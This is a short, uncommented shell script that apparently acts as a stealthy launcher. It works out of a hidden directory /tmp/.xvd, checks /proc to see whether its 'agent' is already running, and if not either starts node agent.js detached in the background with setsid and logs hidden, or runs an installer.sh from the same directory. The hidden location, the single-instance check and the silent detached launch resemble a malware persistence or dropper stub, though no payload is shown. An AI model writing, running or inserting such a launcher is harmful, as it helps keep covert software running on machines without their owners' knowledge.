D=/tmp/.xvd
if ls /proc/*/cmdline >/dev/null 2>&1; then
  for p in /proc/[0-9]*/cmdline; do
    tr '\0' ' ' < "$p" 2>/dev/null | grep -q "$D/agent" && exit 0
  done
fi
mkdir -p "$D"
chmod 700 "$D" 2>/dev/null
if [ -f "$D/agent.js" ]; then
  cd "$D" && setsid node agent.js >> agent.log 2>&1 < /dev/null &
  exit 0
fi
cd "$D" && sh installer.sh >> install.log 2>&1
